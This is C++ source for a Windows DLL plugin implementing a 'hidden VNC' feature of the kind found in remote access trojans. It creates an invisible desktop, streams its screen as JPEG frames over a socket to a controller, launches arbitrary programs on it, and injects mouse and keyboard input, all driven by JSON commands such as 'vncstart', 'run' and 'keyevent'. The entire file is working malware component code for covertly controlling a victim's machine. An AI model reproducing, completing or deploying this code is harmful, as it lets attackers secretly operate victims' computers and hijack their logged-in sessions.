#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <condition_variable>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HIDDEN_VNC_FRAME = 0x06;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_vncSocket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 15;
static int g_jpegQuality = 50;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static HDESK g_hHiddenDesktop = NULL;
static const wchar_t* HIDDEN_DESKTOP_NAME = L"HiddenVNC_Desktop";

// Input Queue System
struct InputEvent {
    string type; // "mouse", "key"
    string event;
    int button;
    int x, y;
    int vk;
};

static queue<InputEvent> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCv;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

static bool safe_send_raw(SOCKET sock, const string& data) {
    if (sock == INVALID_SOCKET) return false;
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_vnc_frame(SOCKET sock,
                                int scale,
                                int width,
                                int height,
                                const vector<unsigned char>& jpegBytes) {
    if (sock == INVALID_SOCKET || jpegBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = 0;
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)g_targetFps;
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = MONITOR_FRAME_FORMAT_JPEG;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_HIDDEN_VNC_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + jpegBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_vnc_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "hiddenvnc_error";
    response["error"] = message;
    safe_send_json(sock, response);
}

static void send_vnc_status(SOCKET sock, const string& status) {
    json response;
    response["action"] = "hiddenvnc_status";
    response["status"] = status;
    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();
    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }
    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }
    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }
    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }
    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }
    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();
    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }
    return true;
}

static bool init_hidden_desktop() {
    if (g_hHiddenDesktop) return true;

    g_hHiddenDesktop = OpenDesktopW(HIDDEN_DESKTOP_NAME, 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(HIDDEN_DESKTOP_NAME, NULL, NULL, 0, GENERIC_ALL, NULL);
    }

    return g_hHiddenDesktop != NULL;
}

static void input_worker() {
    if (!init_hidden_desktop()) return;
    SetThreadDesktop(g_hHiddenDesktop);

    while (g_inputRunning.load()) {
        InputEvent ev;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCv.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning.load(); });
            if (!g_inputRunning.load() && g_inputQueue.empty()) break;
            ev = g_inputQueue.front();
            g_inputQueue.pop();
        }

        if (ev.type == "mouse") {
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            int realX = MulDiv(ev.x, width, 65535);
            int realY = MulDiv(ev.y, height, 65535);

            HWND hWnd = WindowFromPoint({ realX, realY });
            if (hWnd) {
                POINT pt = { realX, realY };
                ScreenToClient(hWnd, &pt);
                LPARAM lParam = MAKELPARAM(pt.x, pt.y);
                UINT msgDown = 0, msgUp = 0, msgMove = WM_MOUSEMOVE;
                WPARAM wParam = 0;

                if (ev.button == 0) { msgDown = WM_LBUTTONDOWN; msgUp = WM_LBUTTONUP; wParam = MK_LBUTTON; }
                else if (ev.button == 1) { msgDown = WM_RBUTTONDOWN; msgUp = WM_RBUTTONUP; wParam = MK_RBUTTON; }

                if (ev.event == "move") PostMessageA(hWnd, msgMove, wParam, lParam);
                else if (ev.event == "down") PostMessageA(hWnd, msgDown, wParam, lParam);
                else if (ev.event == "up") PostMessageA(hWnd, msgUp, 0, lParam);
            }
        } else if (ev.type == "key") {
            HWND hWnd = GetForegroundWindow();
            if (hWnd) {
                if (ev.event == "down") PostMessageA(hWnd, WM_KEYDOWN, ev.vk, 0);
                else if (ev.event == "up") PostMessageA(hWnd, WM_KEYUP, ev.vk, 0);
            }
        }
    }
}

static void start_input_worker() {
    if (g_inputRunning.exchange(true)) return;
    g_inputThread = thread(input_worker);
}

static void stop_input_worker() {
    g_inputRunning.store(false);
    g_inputCv.notify_all();
    if (g_inputThread.joinable()) g_inputThread.join();
}

static void capture_loop() {
    if (!init_hidden_desktop()) {
        send_vnc_error(g_vncSocket, "Failed to create hidden desktop");
        g_captureRunning.store(false);
        return;
    }

    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        send_vnc_error(g_vncSocket, "Failed to set thread desktop: " + to_string(GetLastError()));
        g_captureRunning.store(false);
        return;
    }

    while (g_captureRunning.load()) {
        DWORD frameStart = GetTickCount();
        int scale = 50;
        int quality = 50;
        SOCKET sock = INVALID_SOCKET;

        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            quality = g_jpegQuality;
            sock = g_vncSocket;
        }

        if (sock == INVALID_SOCKET) {
            g_captureRunning.store(false);
            break;
        }

        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        if (width <= 0 || height <= 0) {
            // Might happen if desktop is just created
            Sleep(100);
            continue;
        }

        int outWidth = max(1, (width * scale) / 100);
        int outHeight = max(1, (height * scale) / 100);

        HDC hdcScreen = GetDC(NULL);
        if (hdcScreen) {
            HDC hdcMem = CreateCompatibleDC(hdcScreen);
            if (hdcMem) {
                HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, outWidth, outHeight);
                if (hbm) {
                    HGDIOBJ old = SelectObject(hdcMem, hbm);

                    SetStretchBltMode(hdcMem, HALFTONE);
                    if (StretchBlt(hdcMem, 0, 0, outWidth, outHeight, hdcScreen, 0, 0, width, height, SRCCOPY)) {
                        SelectObject(hdcMem, old);

                        vector<unsigned char> jpegBytes;
                        string error;
                        if (bitmap_to_jpeg(hbm, (ULONG)quality, jpegBytes, error)) {
                            if (!safe_send_vnc_frame(sock, scale, outWidth, outHeight, jpegBytes)) {
                                g_captureRunning.store(false);
                            }
                        }
                    } else {
                        SelectObject(hdcMem, old);
                    }
                    DeleteObject(hbm);
                }
                DeleteDC(hdcMem);
            }
            ReleaseDC(NULL, hdcScreen);
        }

        DWORD elapsed = GetTickCount() - frameStart;
        DWORD interval = 1000 / max(1, g_targetFps);
        if (elapsed < interval) Sleep(interval - elapsed);
        else Sleep(1);
    }
}

static void stop_capture() {
    g_captureRunning.store(false);
    if (g_captureThread.joinable()) g_captureThread.join();
}

static void start_capture(SOCKET sock, int quality) {
    {
        lock_guard<mutex> lock(g_captureMutex);
        g_vncSocket = sock;
        g_jpegQuality = quality;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable()) g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }
    send_vnc_status(sock, "started");
}

static void run_process(SOCKET sock, const string& path) {
    if (!init_hidden_desktop()) {
        send_vnc_error(sock, "Hidden desktop not initialized");
        return;
    }

    wstring wPath(path.begin(), path.end());
    wstring wDesktop(HIDDEN_DESKTOP_NAME);

    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = (LPWSTR)wDesktop.c_str();
    PROCESS_INFORMATION pi = { 0 };

    if (CreateProcessW(NULL, (LPWSTR)wPath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        send_vnc_status(sock, "Process started: " + path);
    } else {
        send_vnc_error(sock, "Failed to start process: " + path + " (Error: " + to_string(GetLastError()) + ")");
    }
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    init_hidden_desktop();
    start_input_worker();
    json response;
    response["action"] = "hiddenvnc_initialized";
    safe_send_json(sock, response);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "vncstart") {
            int quality = command.value("quality", 50);
            start_capture(sock, quality);
        } else if (action == "vncstop") {
            stop_capture();
            send_vnc_status(sock, "stopped");
        } else if (action == "run") {
            string path = command.value("path", "");
            run_process(sock, path);
        } else if (action == "mouseevent") {
            InputEvent ev;
            ev.type = "mouse";
            ev.event = command.value("event", "");
            ev.button = command.value("button", 0);
            ev.x = command.value("x", 0);
            ev.y = command.value("y", 0);
            {
                lock_guard<mutex> lock(g_inputMutex);
                g_inputQueue.push(ev);
            }
            g_inputCv.notify_one();
        } else if (action == "keyevent") {
            InputEvent ev;
            ev.type = "key";
            ev.event = command.value("event", "");
            ev.vk = command.value("key", 0);
            {
                lock_guard<mutex> lock(g_inputMutex);
                g_inputQueue.push(ev);
            }
            g_inputCv.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        stop_capture();
        stop_input_worker();
        if (g_hHiddenDesktop) CloseDesktop(g_hHiddenDesktop);
        shutdown_gdiplus();
    }
    return TRUE;
}
